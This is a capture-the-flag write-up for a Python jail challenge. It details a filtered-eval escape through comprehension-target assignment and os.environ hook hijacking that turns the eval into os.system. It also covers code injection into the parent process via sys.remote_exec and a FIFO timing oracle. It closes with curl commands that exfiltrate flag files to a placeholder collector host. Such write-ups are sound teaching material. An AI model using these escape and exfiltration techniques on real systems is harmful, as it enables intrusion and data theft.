# The pyjail

| | |
|---|---|
| Event | The Few Chosen CTF 2026 |
| Category | misc |
| Difficulty | grandpa |
| Author | Hiumee |
| Points at close | 206 |
| Solves | 72 |
| Status | solved |

> pyjail

Files: [`jail.zip`](handout/jail.zip)

<details>
<summary><b>Solution</b></summary>

## Solution

A list comprehension's `for` target may be an attribute reference or a subscript, and a
comprehension is an expression, so `[[]for[a.b]in[[v]]]` performs the assignment `a.b = v`
inside a bare `eval` without any `=` sign, parentheses, or space in it. That one
line turns a filter which allows only `abcdefghijklmnopqrstuvwxyz:_.[],` from a wall into an
inconvenience, because with assignment you can overwrite the three attributes that
`os.environ[k] = v` calls, and a subscript store then becomes an arbitrary two-argument call.

The return channel is the second problem: `python3 user.py` runs as a child and cannot talk back.

## Recon, in the order it ran

```bash
unzip -o handout/jail.zip -d scratch/hx
ls scratch/hx                 # Dockerfile  jail.py  run.sh
cat scratch/hx/jail.py
cat scratch/hx/Dockerfile     # FROM python:3.15-rc-slim, /flag.txt chmod 400, curl installed
cat scratch/hx/run.sh         # docker run ... --cap-add=SYS_PTRACE
```

The handout is 1371 bytes and line 11 of `jail.py` holds the entire challenge.

```python
import sys
def idk(a, b, fn):
    fn(a, b)
code = ''.join(c for c in open("user_input").read()
               if c in "abcdefghijklmnopqrstuvwxyz:_.[],")
if "ass" in code or "typ" in code or "als" in code:
    print("Nope")
else:
    eval(code, {"__builtins__": {"idk":idk,"sys":sys}})
```

![jail.py keeps 32 characters and evals what is left](media/02-the-filter.png)

Read what the alphabet takes away and the shape of the problem appears at once. Parentheses are missing, so calls must come from elsewhere. The `=` sign is missing, so statement-level assignment is out, and `eval` would reject a statement anyway. Digits are missing, so slice bounds must come from interpreter constants. Quotes are missing, so strings must be sliced from existing ones. Uppercase letters and spaces are both missing. The three banned substrings are aimed
individually at `__class__`, at `__subclasses__` together with `type`, and at `__globals__`,
so the usual class walk out of a restricted `eval` is closed by name, and only `sys` and the
decoy `idk` sit in the globals dictionary.

Three facts from the other two files matter later. `run.sh` adds `--cap-add=SYS_PTRACE`,
which reads as a deliberate signpost toward [PEP 768](https://peps.python.org/pep-0768/) and
its `sys.remote_exec(pid, script_path)`, a function taking exactly the two arguments that
`idk` forwards. The Dockerfile installs `curl`, which sits unused by the challenge. The
local flag is literally `TEST{flag}`, so every local run is a mechanism check and never an
answer.

![the handout is three small files](media/01-handout-and-service.png)

## Finding the assignment

The crux, stated early and worked from there, is that a call primitive has to come out of
subscripting, attribute access, or slicing, since those are the only three syntactic forms
the alphabet leaves standing. Decorators need an `@` and a statement. The walrus operator
needs `:=`. Format strings need quotes.

What breaks it open is that Python keywords can sit directly next to a bracket without whitespace, so `for` and `in` are both writable without any space character, and the grammar
then allows a comprehension target to be any assignable target, including
`Attribute(ctx=Store)` and `Subscript(ctx=Store)`:

```python
[[]for[a.b]in[[v]]]        # a.b = v
[[]for[a[k]]in[[v]]]       # a[k] = v
```

Both forms were checked with `ast.parse` inside the real `python:3.15-rc-slim` image before
anything else was built on them, and both parse with the store context you would want.

![a comprehension target is an assignment, and os.environ turns it into a call](media/03-assignment-and-call-primitive.png)

## From assignment to a call

An assignment is not yet a call, and the bridge is `os._Environ.__setitem__`, which in 3.15
runs `putenv(self.encodekey(key), self.encodevalue(value))`. The `encodekey` and
`encodevalue` names resolve to per-instance attributes, and `putenv` is a module global on
`os` rather than a bound method, so all three are writable through the primitive above. Once
they are, a single subscript store becomes a two-argument call with one nested one-argument
call per argument.

Getting a reference to `os` needs the two-character string `os`, which means slicing it out
of some string already reachable from `sys`. Slice bounds need integers, and those come from
interpreter constants such as `sys.flags.debug` for 0, `sys.float_info.radix` for 2, and
`sys.float_info.dig` for 15. Larger offsets come from chaining, since `s[a:][b:]` equals
`s[a+b:]`, so any integer expressible as a sum of available constants is reachable.

Two further pieces make string building work. `sys.abiflags` is the empty string on this
build, so `sys.abiflags.join` is `''.join` and turns a list of slices into one string, while
`sys.intern` is the identity on `str` and therefore a harmless `encodekey`. The finished
chain is six comprehension assignments plus one final subscript that fires the command.

```python
sys.q                      = sys.modules[<'os' sliced out of a docstring>]
sys.q.putenv               = sys.__setattr__
sys.q.environ.encodekey    = sys.intern
sys.q.environ.encodevalue  = sys.abiflags.join
sys.q.environ[sys.platform] = [<char slices>]   # sys.linux = "<command>"
sys.q.environ.encodekey    = sys.q.system
sys.q.environ[sys.linux]                        # os.system("<command>")
```

The last line may raise `KeyError` on its way out, which does not matter, because the command
has already run by then.

`solve/dump_sources.py` runs inside the container and walks `sys` and `os` to depth three,
recording every integer under 4000 and every string reachable by a path written in the
allowed alphabet. `solve/gen.py` consumes that dump and builds the command string greedily,
taking at each step the longest prefix it can cut as a slice out of any reachable string.

![the finished payload, one expression of seven steps](media/04-built-expression.png)

One bug in that generator is worth repeating, because it fails silently rather than loudly.
The first dump captured strings whose value depends on how the interpreter started,
`sys.argv`, `sys.path[0]`, `__file__`, and `co_filename` among them, and those differ between
the dump process and `user.py`. A slice taken from one of them produced `/procuself/fd`
instead of `/proc/self/fd` at run time, and reports nothing. `gen.py` now
blacklists that whole family, and it also prefers integers from stable interpreter constants
over anything derived from line numbers or code-object shapes, so a rebuild of the same
CPython version does not quietly shift a slice bound.

## The return channel, which took longer than the escape

`jail.py` runs `python3 user.py` as a child and does not print anything the child writes, so a working
`os.system` still sends output that nobody can see. Four routes were tried before one
landed.

Writing to the parent's client socket through `/proc` is dead on every Linux, not only on
this one. Inside the container pid 1 is `jail.py`, fd 3 is the listening socket, and fd 4 is
the accepted client socket, so `cat /f* >/proc/1/fd/4` looks perfect; opening a socket inode
through `/proc/<pid>/fd/<n>` nonetheless returns ENXIO, with and without `CAP_SYS_PTRACE`,
and that was confirmed locally on containers built both ways.

Inheriting the socket into the child does not work either, because
[PEP 446](https://peps.python.org/pep-0446/) makes a socket returned by `accept()`
non-inheritable, so the `exec` inside `os.system` closes fd 4 before the shell ever starts,
and the child's fd table is empty of sockets.

![reopening a socket through /proc returns ENXIO everywhere](media/06-return-channel.png)

`sys.remote_exec` does work, and it is what `--cap-add=SYS_PTRACE` is for. Injecting a script
into pid 1 runs that script inside `jail.py` itself, where `os.write(4, flag)` lands directly
on the client socket, and `solve/solve.py` does exactly that against a local copy of the
image with the client receiving `TEST{flag}` end to end. Two details had to be handled. The
accepted socket alternates between fd 4 and fd 5 across connections, because `jail.py` keeps
the previous `client_socket` referenced until the next `accept()`, so the injected script
loops the low fds inside `try`. The injected script also fires only when the target next runs
bytecode, and `jail.py` spends its life blocked in `accept()`, so the script writes the flag
to every fd forty times over twelve seconds, which keeps `jail.py` busy and pins our own fd
open for the duration.

![the exploit against a local copy of the image](media/05-local-exploit-run.png)

Against the deployed pod, three runs returned only `Send your code:` and
`Running your code...`, all three preserved in `artifacts/remote-run.txt`. The likely cause is
that the pod does not grant the capability, so `ptrace_may_access` refuses the attach at
syscall time. I never measured that on the pod, so it should stay a hypothesis. One related
thing is certain, and it is a trap for anyone testing the same way, since
`hasattr(sys, "remote_exec")` is not a capability test at all; 3.15 builds the function in
regardless, and the permission check happens only when the attach runs.

A timing channel was designed as the fallback, and half of it died on a kernel rule. Stopping
pid 1 with `kill -STOP 1` from inside the container is silently discarded, because a
pid-namespace init has `SIGNAL_UNKILLABLE` set and `sig_task_ignored()` drops SIGKILL and
SIGSTOP unless the sender lives in an ancestor namespace. That was verified on the local
no-capability container, where the process state stays `S (sleeping)` and nothing anywhere
reports an error.

The replacement avoids signals entirely and lives in `solve/oracle.py` together with
`solve/daemon_src.py`. `jail.py` opens `user_input` for writing on every connection, and
opening a FIFO for writing blocks until a reader appears, so replacing that path with a FIFO
hands a root daemon of ours exact control over when `jail.py` may proceed. The daemon then
sets the gap between the banner and `Running your code...` to `0.20 + 0.12 * nibble` seconds
and the client reads the flag four bits at a time, with both clocks anchored to the same FIFO
close so the gap is stable to milliseconds. Getting there needs a bootstrap, and the
bootstrap is cheap, since rewriting `/app/user.py` to `exec(open("/app/user_input").read())`
compiles to only 2945 bytes of expression, after which every later connection's raw body runs
as unfiltered root Python. The whole design works locally and was never pointed at the pod,
because the outbound route landed first.

## What actually worked

The Dockerfile installs `curl` and the challenge never calls it.

```sh
curl -sk <collector>/pjalive
cat /flag* /*flag* >/tmp/f 2>&1
curl -sk --data-binary @/tmp/f <collector>/pjflag
```

`gen.build` encoded that command in 8428 bytes of expression and 78 join pieces. A harmless marker on `/pjalive` fires alongside the flag exfil, so silence on the flag path means "flag not read" rather than "nothing got out". Both hits arrived, three seconds apart.

The client sees nothing, by design, so `solve/pwn.py` does not report any flag on its three
attempts and the answer is sitting on the collector.

![the winning remote run, seen from the client](media/07-outbound-run.png)

The `/pjalive` and `/pjflag` paths were invented for this run alone, so the collector log attributes the flag unambiguously.

## Operational notes

This challenge uses `connection_type: "nodeport"`, plain TCP without TLS or SNI. Three running instances per team is the cap, so `solve/pwn.py` claims a slot, fires, and releases inside forty seconds.

## Reproduce

```bash
python3 solve/gen.py                      # print the expression for the default command
python3 solve/genboot.py                  # the 2945-byte bootstrap expression
python3 solve/local_jail.py               # run the handout image locally, flag is TEST{flag}
python3 solve/solve.py                    # local: sys.remote_exec route, returns TEST{flag}
python3 solve/pwn.py                      # remote: claim a slot, fire the curl expression
```

`solve/dump_sources.py` and `solve/dump2.py` run inside the container and regenerate the
string and integer tables that `gen.py` reads, which is necessary if the image is ever
rebuilt on a different 3.15 point release.

![the flag arrives on the outbound callback](media/08-flag.png)

Flag: `TFCCTF{i_hope_this_is_not_the_last_jail}`
</details>
